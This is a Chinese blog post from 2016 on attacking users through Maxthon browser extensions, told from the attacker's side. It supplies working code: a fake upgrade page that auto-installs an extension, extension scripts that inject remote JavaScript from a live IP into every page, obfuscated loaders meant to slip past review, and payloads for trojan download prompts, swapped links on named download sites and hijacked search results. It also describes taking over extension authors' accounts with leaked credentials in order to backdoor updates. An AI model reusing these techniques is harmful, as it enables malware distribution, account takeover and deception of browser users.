---
title: 浏览器插件的攻击向量
description: 因为浏览器插件具有很多特权的 API，利用这些 API 可以做到之前不能做到的事情，本篇文章也只是抛砖引玉
date: 2016-10-05T20:35:52+08:00
tags:
  - web security
  - browser plugin
translationKey: browser-plugin-attack-vector
aliases:
  - /zh/2016/12/14/browser-plugin-attack-vector/
  - /zh/p/browser-plugin-attack-vector/
  - /zh/posts/浏览器插件的攻击向量/
---

## 0x0 前言: {#intro}

我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做 APT 攻击的话也会有奇效。

## 0x1 让自己变成攻击者: {#become-attacker}

我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前 chrome 有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。

在大家的理解里，浏览器插件攻击就是在插件里植入 javascript 代码，做一些盗取 cookies 的事情，但是事情远没有那么简单。

大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是 4 种安装插件的方法:

> 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”

> 被动等待，类似: 姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装

> 基于社工库控制插件作者的账户，加入后门代码，更新插件

> 控制插件里调用的第三方 javascript 代码

现在有四种方法供我们选择，我们一个个来进行介绍。

## 0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件” {#deceive-user}

这个方法类似于之前的问题 [强迫安装恶意 Chrome 扩展 攻击者使用激进方式](http://www.cnbeta.com/articles/470593.htm)。这里我们也来实现一下并且优化下，此处使用的案例是“MaxThon 遨游浏览器插件”。

### 0x1.1.1 检测是否安装了某插件 {#detect-extension}

我们先把这个攻击方式的代码目录架构进行说明:

网站页面: `index.html`

插件目录:

```text
icons/              插件的 logo 存放目录

icons/icons.svg     插件 logo 文件

def.json            插件的主控制文件，里面存着整个插件的配置
代码如下:
[
    {
        "type": "extension",
        "frameworkVersion": "1.0.0",
        "version": "1.0.0",
        "guid": "{7c321680-7673-484c-bcc4-de10f453cb8e}",
        "name": "plug_setup",
        "author": "Black-Hole",
        "svg_icon": "icon.svg",
        "title": {
            "zh-cn": "欺骗用户安装插件"
        },
        "description": {
            "zh-cn": "欺骗用户安装插件"
        },
        "main": "index.html",
        "actions": [
            {
                "type": "script",
                "entryPoints": [
                    "doc_onload"
                ],
                "js": [
                    "base.js"
                ],
        "include": ["*"],
        "includeFrames": true
             }
        ]
    }
]
base.js             每打开一个页面，要执行的 JavaScript 代码
```

我翻遍了整个遨游插件的 API 手册，没有找到类似 chrome Plug API 的:

```js
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if(request.act == 'ping'){
        sendResponse({"act": "tong"});
    }
})
chrome.runtime.sendMessage("extensionId", {"act": "ping"}, function(response){
    if(response && response.act == 'tong'){
        console.log('已安装');
    }else{
        console.log('未安装');
    }
});
```

既然没有找到，我们就要想其他比较 Hack 的办法来解决这个问题。

这里我使用的办法是利用 JavaScript 全局及 setTimeout 函数来解决这个问题。

首先在插件里的 base.js 文件里写入:

```js
var script = document.createElement('script');
script.src = "http://119.29.58.242/control.js";
document.body.appendChild(script);
```

上面，这段代码将会在每个页面里的 body 标签后面写入 `<script src="http://119.29.58.242/control.js"></script>` 代码，而在 `http://119.29.58.242/control.js` 文件里的代码为:

```js
window.plug_setup = function(){

}
```

这时，用户打开任何一个网页，那个网页的全局函数中就会有一个名为 plug_setup 的函数，并且不具有任何作用，很容易让人忽略掉，只会在特殊的页面中才会起作用。

然后我们再在网站的页面里写:

```js
setTimeout(function(){
    if(typeof(plug_setup)!="function"){
        alret("因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面");
    }
},1000)
```

因为页面加载、网络等问题照成的延迟问题，这里我们设置为 1 秒后运行检测代码。1 秒后，将会运行

```js
if(typeof(plug_setup)!="function"){
    alret("因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面");
}
```

这个时候如果全局没有 plug_setup 函数，将会运行下面的 alert 函数，告诉用户需要安装插件才可以访问。

### 0x1.1.2 欺骗用户进行半自动安装指定插件 {#semi-auto-install}

我觉的如果让用户安装插件的话，你跳转到页面，让用户把插件的信息、评论看完再安装，岂不是成功率大大降低了，而且也不符合网站的优化。《点石成金》一书上说过这样一句话“不要让用户思考”，这个虽然是网站设计里面的至理名言，但是也同样可以放在攻击里，当一个用户的思考变得更少时，那么他会有很大程度上会跟着攻击者设计好的路走。

于是，我分析了遨游浏览器安装插件页面里的 JavaScript，发现遨游浏览器进行安装插件时调用 API 在任何页面都可以运行，会照成攻击者在页面写上一些 JavaScript 代码后，就会像遨游浏览器那样弹出一个框询问用户是否安装插件:

![](/images/browser-plugin-attack-vector/maxthon-install-dialog.png)

我这里进行一些优化，代码如下:

```js
var ERRORTEXT = '非傲游浏览器或版本过低。<a href="http://www.maxthon.cn" target="_blank">点此获取最新版本傲游浏览器</a>'
function getInstallMessage(that, messagePack, type) {
    if (external.mxCall) {
        var packMxAttr = $(that).closest(messagePack);
        if (type === 'skin') {
            // 浏览器框架版本号
            var frameVersion = external.mxCall('GetSkinFxVersion');
        }
        else if (type === 'app') {
            // 浏览器框架版本号
            var frameVersion = external.mxCall('GetAppFxVersion');
            // 下个版本上了就删掉--
            if (frameVersion === '1.0.0') {
                frameVersion = '1.0.1';
            }
            // --下个版本上了就删掉
        }
        // 插件包框架版本号
        var packMxVersion = packMxAttr.attr('file_def');
        // 插件包 url
        var packUrl = packMxAttr.attr('file_url');
        // 插件 id
        var packId = packMxAttr.attr('file_id');
        installPack(frameVersion, packMxVersion, packUrl, type, packId);
    }
    else {
        resultPop.show('浏览器不符', ERRORTEXT, '确定');

    }
}
function installPack(frameVersion, packMxVersion, packUrl, type, packId) {
    var isInstall = returnIsInstall(frameVersion, packMxVersion);
    if (isInstall !== -1) {
        if (type === 'skin') {
            external.mxCall('InstallSkin', packUrl);
        }
        else if (type === 'app') {
            external.mxCall('InstallApp', packUrl);
        }
        getUser(packId);
    }
    else {
        resultPop.show('浏览器不符', ERRORTEXT, '确定');
    }
}
function returnIsInstall(frameVersion, packMxVersion) {
    var fvItem;
    var pvItem;
    var frameVersion = getVersionArr(frameVersion);
    var packMxVersion = getVersionArr(packMxVersion);
    // 定义增长索引值.
    var i = 0;
    while (1) {
        fvItem = frameVersion[i];
        pvItem = packMxVersion[i];
        if (fvItem == null && pvItem == null) {
            return 0;
        }
        if (fvItem == null) {
            return -1;
        }
        if (pvItem == null) {
            return 1;
        }
        if (fvItem != pvItem) {
            var value = fvItem > pvItem ? 1 : -1
            return value;
        }
        i++;
    }
}
function getVersionArr(version) {
    var versionArr = version.split('.');
    for (var i = 0; i < versionArr.length; i++) {
        versionArr[i] = parseInt(versionArr[i], 10);
    };
    return versionArr;
}
function getUser(id) {
    $.ajax({
        type: 'GET',
        url: 'http://extension.maxthon.cn/common/ajax.php?id=' + id,
        data: 'data',
        dataType: 'json',
        success: function (data) {},
        error: function () {}
    });
}
$(document).delegate('#app-install', 'click', function (event) {
    event.preventDefault();
    event.stopPropagation();
    getInstallMessage(this, 'a[file_def]', 'app');
});
```

详情可以在 [http://extension.maxthon.cn/js/temp.js](http://extension.maxthon.cn/js/temp.js) 里第 1256 行到 1600 行查看原始代码。

此处的代码里的入口处就在

```js
$(document).delegate('#app-install', 'click', function (event) {
    event.preventDefault();
    event.stopPropagation();
    getInstallMessage(this, 'a[file_def]', 'app');
});
```

当点击 id 为 `app-install` 的 DOM 时，会先调用 `getInstallMessage` 函数，`getInstallMessage` 函数里再调用 `installPack` 函数，`installPack` 函数调用 `returnIsInstall` 函数和 `getUser` 函数，`returnIsInstall` 函数调用了 `getVersionArr` 函数。

最核心的代码在 installPack 函数里的 `external.mxCall('InstallApp', packUrl);`，但是无法直接调用，不然无法安装。而且这里的 packUrl 必须是 `http://extension.maxthon.cn` 下的，不然无法安装，需要事先提交你的插件到遨游插件平台，才可以。

上面说到当点击 id 为 `app-install` 的 DOM 时才会触发，我这个人比较懒。就直接 copy 遨游插件的 html 代码了，顺便把他隐藏了:
`<a id="app-install" style="display:none;" file_def="1.0.1" file_url="http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon" file_id="<?echo $view_id;?>">安装</a>`，这里的 file_id 为 `<?echo $view_id;?>` 估计是遨游的程序员没写好代码，PHP 没解析成功，解析成 html 代码了。但是我懒得改，就这样把。然后我再在他们的后面增加 `$("#app-install").click();` 代码，让他自动触发

完整的网站代码如下:

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>欺骗用户安装插件</title>
    <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
</head>
<body>
    欺骗用户安装插件 demo1
    <a id="app-install" style="display: none;" file_def="1.0.1" file_url="http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon" file_id="<?echo $view_id;?>">安装</a>
</body>
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
<script>
    setTimeout(function(){
        if(typeof(plug_setup)!="function"){
            alert("因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装 xx 插件后打开此页面");
            var ERRORTEXT = '非傲游浏览器或版本过低。<a href="http://www.maxthon.cn" target="_blank">点此获取最新版本傲游浏览器</a>'
            function getInstallMessage(that, messagePack, type) {
                if (external.mxCall) {
                    var packMxAttr = $(that).closest(messagePack);
                    if (type === 'skin') {
                        // 浏览器框架版本号
                        var frameVersion = external.mxCall('GetSkinFxVersion');
                    }
                    else if (type === 'app') {
                        // 浏览器框架版本号
                        var frameVersion = external.mxCall('GetAppFxVersion');
                        // 下个版本上了就删掉--
                        if (frameVersion === '1.0.0') {
                            frameVersion = '1.0.1';
                        }
                        // --下个版本上了就删掉
                    }
                    // 插件包框架版本号
                    var packMxVersion = packMxAttr.attr('file_def');
                    // 插件包 url
                    var packUrl = packMxAttr.attr('file_url');
                    // 插件 id
                    var packId = packMxAttr.attr('file_id');
                    console.log(frameVersion, packMxVersion, packUrl, type, packId)
                    installPack(frameVersion, packMxVersion, packUrl, type, packId);
                }
                else {
                    resultPop.show('浏览器不符', ERRORTEXT, '确定');

                }
            }
            function installPack(frameVersion, packMxVersion, packUrl, type, packId) {
                var isInstall = returnIsInstall(frameVersion, packMxVersion);
                if (isInstall !== -1) {
                    if (type === 'skin') {
                        external.mxCall('InstallSkin', packUrl);
                    }
                    else if (type === 'app') {
                        external.mxCall('InstallApp', packUrl);
                    }
                    getUser(packId);
                }
                else {
                    resultPop.show('浏览器不符', ERRORTEXT, '确定');
                }
            }
            function returnIsInstall(frameVersion, packMxVersion) {
                var fvItem;
                var pvItem;
                var frameVersion = getVersionArr(frameVersion);
                var packMxVersion = getVersionArr(packMxVersion);
                // 定义增长索引值.
                var i = 0;
                while (1) {
                    fvItem = frameVersion[i];
                    pvItem = packMxVersion[i];
                    if (fvItem == null && pvItem == null) {
                        return 0;
                    }
                    if (fvItem == null) {
                        return -1;
                    }
                    if (pvItem == null) {
                        return 1;
                    }
                    if (fvItem != pvItem) {
                        var value = fvItem > pvItem ? 1 : -1
                        return value;
                    }
                    i++;
                }
            }
            function getVersionArr(version) {
                var versionArr = version.split('.');
                for (var i = 0; i < versionArr.length; i++) {
                    versionArr[i] = parseInt(versionArr[i], 10);
                };
                return versionArr;
            }
            function getUser(id) {
                $.ajax({
                    type: 'GET',
                    url: 'http://extension.maxthon.cn/common/ajax.php?id=' + id,
                    data: 'data',
                    dataType: 'json',
                    success: function (data) {},
                    error: function () {}
                });
            }
            $(document).delegate('#app-install', 'click', function (event) {
                event.preventDefault();
                event.stopPropagation();
                getInstallMessage(this, 'a[file_def]', 'app');
            });
            $("#app-install").click();
        }
    },1000);
</script>
</html>
```

打开后的样子:

![](/images/browser-plugin-attack-vector/fake-upgrade-alert.png)

![](/images/browser-plugin-attack-vector/addon-download-progress.png)

![](/images/browser-plugin-attack-vector/lol-plugin-install-prompt.png)

这处的 LOL 战绩查询插件是我之前上传的 (不要安装)。真正攻击时可以换成不要那么二的名字，比如"网站增强工具"等

一开始，我还想试试能不能点击劫持，这样就可以在用户不知情的情况下安装插件，但是这个安装程序不是在页面里面的。无法进行劫持，随之放弃。

这样一来，尽量让用户少思考的网页就做好了。发布，等待用户上钩吧。这个方法可以与 APT 攻击中的"水坑攻击"进行相结合，以达到针对性某些特殊的群体或个体的攻击方式

### 0x1.2 被动等待 {#passive-wait}

这个办法是属于广撒网，当没有指定性群体或者个人，只是为了单纯的攻击或者研究时使用。

这里也有一些小技巧，当开发者上传插件时，遨游审核人员会对插件进行审核，如果发现危害用户的代码，将不给予通过，乍一看没什么问题，但是没有后续了。

> 没有定期自动化扫描插件代码

> 而且即使插件是一个小游戏用，都可以在配置文件 def.json 里申请权限是最高的

> 当代码量足够多的时候，开发人员可以把一些危害到用户请求的代码进行加密混编绕过审查人员的眼睛。（调用伟大的人民领袖毛主席的一句话: 与规矩斗，其乐无穷。与代码斗其乐无穷。与人斗其乐无穷。）

> 可以在插件里调用第三方的 JavaScript 代码，第三方 url 可以指向任何域名。没有进行判断 URL 及 js 文件是否为可信

利用以上的问题，我们就可以写出一个具有危害到用户插件，且绕过审查人员的眼睛。

我们可以在插件源码 base.js 文件里写

```js
//xxxxx 其他多余的代码
var script = document.createElement('script');
script.src = "http://你的域名/javascript文件名.js";
document.body.appendChild(script);
//xxxxx 其他多余的代码
```

如果不放心可可以加密成下面的这种格式:

```js
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"": e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29): c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('o 7=["\\e\\c\\g\\b\\a\\9","\\c\\g\\6\\8\\9\\6\\q\\h\\6\\j\\6\\f\\9","\\e\\g\\c","\\m\\9\\9\\a\\t\\i\\i\\d\\n\\j\\8\\b\\f\\i\\l\\8\\s\\8\\e\\c\\g\\b\\a\\9\\r\\b\\h\\6\\f\\8\\j\\6\\u\\l\\e","\\8\\a\\a\\6\\f\\d\\w\\m\\b\\h\\d","\\x\\n\\d\\v"];o k=p[7[1]](7[0]);k[7[2]]=7[3];p[7[5]][7[4]](k)',34,34,'||||||x65|_0|x61|x74|x70|x69|x63|x64|x73|x6E|x72|x6C|x2F|x6D|script|x6A|x68|x6F|var|document|x45|x66|x76|x3A|x2E|x79|x43|x62'.split('|'),0,{}))

```

方法为: 先在 [javascriptobfuscator](https://javascriptobfuscator.com/Javascript-Obfuscator.aspx) 上把正常的 javascript 代码加密成:

```js
var _0x67c5=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x64\x6F\x6D\x61\x69\x6E\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x66\x69\x6C\x65\x6E\x61\x6D\x65\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var script=document[_0x67c5[1]](_0x67c5[0]);script[_0x67c5[2]]= _0x67c5[3];document[_0x67c5[5]][_0x67c5[4]](script)
```

如图:

![](/images/browser-plugin-attack-vector/javascriptobfuscator-encode.png)

因为这样的代码看起来着实有点可疑...所以再去[站长之家](http://tool.chinaz.com/js.aspx)加密成常见的加密代码:

![](/images/browser-plugin-attack-vector/chinaz-js-encrypt.png)

嗯，看着正常多了。放在众多代码之中，审查人员也很难找到 (也不会用心找的)

提交后，会在遨游插件的首页显示最近更新的插件，你只需要每个星期随便增加一点代码或者删除一点代码，再更新一下插件，你的插件就会常年存在插件首页，安装人数想不多都难。

### 0x1.3 基于社工库控制插件作者的账户 {#hijack-author}

这个也是我个人来说最喜欢的方式，毕竟不得不承认不劳而获真的好爽啊。

因为 Maxthon 更新插件时没有像 Chrome 那样需要秘钥才可以更新，所以导致这个'逻辑漏洞''。因为没有验证当前是否为作者本人的机制，才导致这个方法的可行性。

之前加了 maxthon 插件的作者群: 203339427

里面大多都是插件的开发人员，拿他们的邮箱、QQ 放在社工库里进行查询，得到密码后可以进行尝试登陆。当然因为不确定是作者使用的是哪个邮箱，我们先拿 QQ 邮箱登录，他会提示账户或密码错误，不知道是账户错误还是密码错误，可以先去[遨游账户中心-忘记密码](https://my.maxthon.cn/recover.html)先填写 QQ 邮箱，如果说用户名不存在，我们可以在网上搜索一下这个作者其他的邮箱，再进行测试 (我测试的账户里，很多都需要在网上搜索一下其他的邮箱)。因为之前我把这个当做漏洞提交给 wooyun 了，遨游没什么反应。本来是想登陆其他用户说明的，但是 wooyun 暂时休整，无法看到我之前的漏洞详情，而当时社到的账户和密码也没有备份，只在 wooyun 漏洞详情里有，没有办法，所以这里我就以我自己为例:

![](/images/browser-plugin-attack-vector/uploaded-plugins-list.png)

这里有个`更新文件`，我们这个时候，可以先把文件 download 本地，在里面的 javascript 文件里植入我们的后门。再上传上去。就可以控制 1000 多个用户了。插件二次审核查的更松。

而且当你打开遨游浏览器时，遨游浏览器会检测你的插件是否为最新的，如果不是最新的，他会在后台静默安装最新的插件。这个时候对我们的帮助特别大。比如我们更新插件后，只需要等待用户重新打开遨游浏览器就可以实现了攻击的效果。

更新的时候，就这个账户当做自己的账户就行了，然后照着 0x1.2 代码写上去就没问题了。

### 0x1.4 控制插件里调用的第三方 javascript 代码 {#third-party-js}

这个方法比较繁琐，有两种方法来获取第三方的 javascript，分为两种情况

> 不具有可视化页面

> 具有可视化页面

#### 0x1.4.1 不具有可视化页面 {#no-ui}

类似我上面所说的，在插件的 `def.json` 配置文件里写上:

```json
"actions": [{
    "type": "script",
    "entryPoints": [
        "doc_onload"
    ],
    "js": [
        "base.js"
    ],
    "include": ["*"],
    "includeFrames": true
}]
```

然后在 base.js 文件里写入你要调用的第三方 javascript 文件:

```js
var script = document.createElement('script');
script.src = "http://119.29.58.242/control.js";
document.body.appendChild(script);
```

像这种的话，就需要在把插件 download 本地，然后使用 maxthon 官方提供的 [MxPacker](http://bbs.maxthon.cn/thread-664-1-1.html) 软件，进行的解密，首先分析 `def.json` 里的 action 字段下的 js 属性，指向的是哪个 javascript 文件。再进行分析，当然也可以使用其他软件对文件内容进行搜索，看里面是否存在'document.createElement'关键字。

找到后，接下来就是苦力活了，入侵这个第三方 javascript 所属的网站。入侵后再修改这个 javascript 文件，就行了。

#### 0x1.4.2 具有可视化页面 {#with-ui}

这个比上面 0x1.4.1 简单点，使用之前长短短在 zone 分享的代码就可以把这个页面所有第三方的 javascript 文件列举出来:

```js
for(var i=0,tags=document.querySelectorAll('iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'),tag;tag=tags[i];i++){
  var a = document.createElement('a');
  a.href = tag.src||tag.href||tag.data;
  if(a.hostname!=location.hostname){
    console.warn(location.hostname+' 发现第三方资源['+tag.localName+']:'+a.href);
  }
}
```

使用方法如下:

![](/images/browser-plugin-attack-vector/kuaidi-plugin-detail.png)

![](/images/browser-plugin-attack-vector/inspect-plugin-page.png)

![](/images/browser-plugin-attack-vector/console-typeerrors.png)

![](/images/browser-plugin-attack-vector/third-party-resource-log.png)

使用的时候，会发现有的插件是调用了插件本身的 javascript 文件，或者其他 baidu、360 等第三方安全不容易被入侵的网站里的 javascript 代码，这个时候就比较费时费力了。

### 0x1.4.3 控制插件里调用的第三方 javascript 代码总结 {#third-party-js-conclusion}

这个方法较为繁琐，优点如下:

> 不容易被发现

> 向上反查也比较难追踪

缺点:

> 费时费力

>成功率较低

此种方法适用于针对某一人或团体，只能获得其装的插件名称，当别无他法时使用此方法。

## 0x2 那些隐藏的 API: {#hidden-api}

***
因为一些 API 获得的信息比较隐私，所以遨游官方没在在 API 手册里写。但是他们真实存在，我们可以在一个普通的页面里打开审查元素下的 Console 输入 external 来查看一些遨游官方隐藏的 API。

还有一种是在插件页面的里专用 API，插件里的 API 基本上每个版本上都会发生变化，下面是 3.x 版本的 API:

```js
maxthon.system.Utility.getMacAddresses() //获取用户的 MAC 地址
maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getAvailableFontFamilyNames() //获取用户当前所有的字体文
maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getSystemFontName() //用户当前应用的字体
maxthon.io.File.createTempFile().name_ //获取用户临时目录
maxthon.io.File.createTempFile().isFile //判断 name_文件是否存在，但是这里我无法重新设置 name_的值
```

下面是最新版本 4.x 版本的 API:

遨游把之前在 maxthon 对象下的函数、对象分离在其他地方了（其实还是有，不明白其用意）

```js
mx.app.getAvatar()    //获得当前登录用户的头像 (data: image/png;base64 格式)
mx.app.login()    //判断是否登录了遨游浏览器 (登录返回 true，没登陆返回 false)
mx.app.getProfile()    //获得用户当前的状态 (是否登录、uid、用户名称)
mx.app.getSystemLocale()    //获得系统语言 (例如: zh-cn)
mx.app.showUserPanel()    //显示用户菜单 (相当于点击左上角的头像)
//以上的代码需要事先运行 mx.app.user()、mx.app.locale()

clientInformation.plugins     //浏览器支持的插件 (可看到用户安装哪些软件)
clientInformation.mimeTypes    //列举出支持的 application(可看到用户安装哪些软件)
```

这里针对最后两个 API 截图看下:

![](/images/browser-plugin-attack-vector/plugins-api-output.png)

![](/images/browser-plugin-attack-vector/mimetypes-api-output.png)

这些东西写在插件里，获取用户安装了哪些软件轻而易举。基本上是没有隐私可言了。

## 0x3 攻击向量: {#attack-vectors}

***
普通的获取 cookies 我们就不说了，介绍点其他的。

上面介绍的都是针对浏览器插件对用户进行的攻击，但是攻击的平面都是浏览器。但是谁不想进一步控制用户的电脑权限呢。大致的思路如下:

> 弹窗欺骗用户说需要下载软件，其实是木马程序

> 使用浏览器漏洞进行攻击

> 替换下载链接

### 0x3.1 弹窗欺骗用户下载软件 {#fake-download}

这一步很简单，就是一些简单的 javascript 代码:

```js
(function(){    //闭包函数，防止变量污染
    alert("请下载xxx安全插件保障您在此网站的安全");
    location.href = "http://baidu.com/download/xxxx.exe";
})()
```

但是这里不能一直弹窗下载，不然肯定会引起怀疑的，下面我们来进行优化:

```js
(function(){    //闭包函数，防止变量污染
    var downDate = new Date();  //获取当前的时间
    var downDateY = String(downDate).split(" ")[3]; //年份
    var downDateM = String(downDate).split(" ")[1]; //月份
    var downDateD = String(downDate).split(" ")[2]; //日期
    var downDateT = String(downDate).split(" ")[4].split(":");  //时间
    if(location.href != "https://baidu.com/"){  //当不是百度时，不执行下面的代码
        return fasle;
    }
    if(downDateY == "2016" && downDateM == "Oct" && downDateD == "28" && downDateT[0] == "21" && downDateT[1] < "30"){
        alert("请下载xxx安全插件保障您在此网站的安全");
        location.href = "http://baidu.com/download/xxxx.exe";
    }
})()
```

真正写的时候，不要像我这么写，我这样写是因为逻辑比较简单，但是代码量比较多。意思是说当当前网站是 `https://baidu.com/` 时再判断时间是否为 2016 年 10 月 28 号晚上 9 点到 9 点半之间，如果是则弹窗让用户下载木马程序。

### 0x3.2 使用浏览器漏洞进行攻击 {#browser-exploit}

漏洞是要靠自己挖掘的，这里不再多说，大家可以去看一下 Blast 写的书籍《浏览器安全》。也可以看下之间黑哥写的 PPT《去年跨过的浏览器》，之前 maxthon 就因为特殊域下的 `mxCall` 函数的问题，导致可以执行任意命令。大家可以挖挖看，总会有意想不到的收获。

### 0x3.3 替换下载链接 {#replace-download}

替换的话，我们需要先采集几个下载量比较大的下载站，我这里列举一下:

> [ZOL 下载-免费软件，绿色软件](http://xiazai.zol.com.cn/)
>
> [天空下载站](http://www.skycn.com/)
>
> [华军软件园](http://www.onlinedown.net/)
>
> [hao123 下载站](http://www.skycn.net/)
>
> [太平洋下载中心](http://dl.pconline.com.cn/)
>
> [百度软件中心](http://rj.baidu.com/)

还有很多，这里就不在列举了，下面我们就根据这些下载站来写替换的 javascript 代码。
先写段代码，让他判断当前的网址是否为下载站

```js
(function(){
    var downloadWebsite = [
        'http://xiazai.zol.com.cn',
        'http://www.skycn.com',
        'http://www.onlinedown.net',
        'http://dl.pconline.com.cn',
        'http://rj.baidu.com'
    ];  //要替换的下载站 url 地址
    var replaceDownloadUrl = "http://xxxx.com/download/soft.rar";   //要替换的下载软件
    switch(location.origin){  //对当前的 url 进判断，是否为下载站，如果是则进入其操作函数里
        case downloadWebsite[0]:
            var download1 = document.getElementById("downloadTop");
            var download2 = document.querySelectorAll(".down-alink a");
            var download3 = document.querySelectorAll(".down-alink01 a");
            if(download1 != null && download2.length != 0 && download3.length != 0){
                download1.href = replaceDownloadUrl;
                for(var j = 0;j < download2.length;j++){
                    download2[j].href = replaceDownloadUrl;
                }
                for(var k = 0;k < download3.length;k++){
                    download3[k].href = replaceDownloadUrl;
                }
            }
        break;
        case downloadWebsite[1]:
            var download1 = document.querySelectorAll(".ul_Address li a");
            if(download1.length != 0){
                for(var j = 0;j < download1.length;j++){
                    download1[j].href = replaceDownloadUrl;
                }
            }
        break;
        case downloadWebsite[2]:
            var download1 = document.querySelectorAll(".softinfoBox .meg a");
            var download2 = document.querySelectorAll(".downDz a");;
            if(download1.length != 0 && download2.length != 0){
                download1[0].href = replaceDownloadUrl;
                for(var j = 0;j < download2.length;j++){
                    download2[j].href = replaceDownloadUrl;
                }
            }
        break;
        case downloadWebsite[3]:
            var download1 = document.querySelectorAll(".dlLinks-a a");
            if(download1.length != 0){
                for(var j = 0;j < download1.length;j++){
                    download1[j].href = replaceDownloadUrl;
                }
            }
        break;
        case downloadWebsite[4]:
            var download1 = document.querySelectorAll(".fast_download");
            var download2 = document.querySelectorAll(".normal_download");
            if(download1.length != 0 && download2.length != 0){
                download1[0].href = replaceDownloadUrl;
                download2[0].href = replaceDownloadUrl;
            }
        break;
    }
})()
```

### 0x3.4 修改百排名 {#seo-ranking}

想做 SEO 的，可以使用此方法:

```js
(function(){
    if(location.origin == "https://www.baidu.com" && location.pathname == "/s"){    //当时百度的搜索页面时
        document.querySelectorAll("#content_left h3 a")[0].href = "http://360.cn/"; //替换第一个搜索结果为指定的 url 地址
    }
})()
```

### 0x3.4 内网嗅探 {#intranet-sniff}

这个方法的篇幅比较多，放在下一章说明。下面是利用 WebRTC 来实现的获取内网 IP 地址:

```js
var ipList = [];
var webrtcxss = {
    webrtc        : function(callback){
        var ip_dups           = {};
        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        var mediaConstraints  = {
            optional: [{RtpDataChannels: true}]
        };
        var servers = undefined;
        if(window.webkitRTCPeerConnection){
            servers = {iceServers: []};
        }
        var pc = new RTCPeerConnection(servers, mediaConstraints);
        pc.onicecandidate = function(ice){
            if(ice.candidate){
                var ip_regex        = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1];
                if(ip_dups[ip_addr] === undefined)
                callback(ip_addr);
                ip_dups[ip_addr]    = true;
            }
        };
        pc.createDataChannel("");
        pc.createOffer(function(result){
            pc.setLocalDescription(result, function(){});
        });
    },
    getIp        : function(){
        this.webrtc(function(ip){
            console.log(ip)
        });
    }
}
webrtcxss.getIp();
```

大家可以根据这个方法来想想有没有办法来实现一些更好玩的思路。

## 0x4 结言: {#conclusion}

***
还有很多的 API 及攻击方法等待大家去发掘，我能做的就是给大家打开一个新的攻击平面，不用再局限那些已经熟悉的方法了。
